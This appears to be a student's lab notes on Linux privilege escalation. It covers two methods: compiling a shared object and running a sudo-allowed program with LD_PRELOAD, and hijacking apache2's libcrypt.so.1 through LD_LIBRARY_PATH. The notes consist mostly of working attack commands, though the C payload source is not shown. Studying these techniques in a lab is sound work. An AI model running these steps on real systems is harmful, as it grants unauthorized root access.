# environment variables

## Method 1



```bash
sudo -l
```

Create a shared object using the code located at /home/user/tools/sudo/preload.c:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

now, Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD\_PRELOAD environment variable to the full path of the new shared object:

```bash
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

***

## Method 2



Run ldd against the apache2 program file to see which shared libraries are used by the program:

```bash
ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Run apache2 using sudo, while settings the LD\_LIBRARY\_PATH environment variable to /tmp (where we output the compiled shared object):

```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```

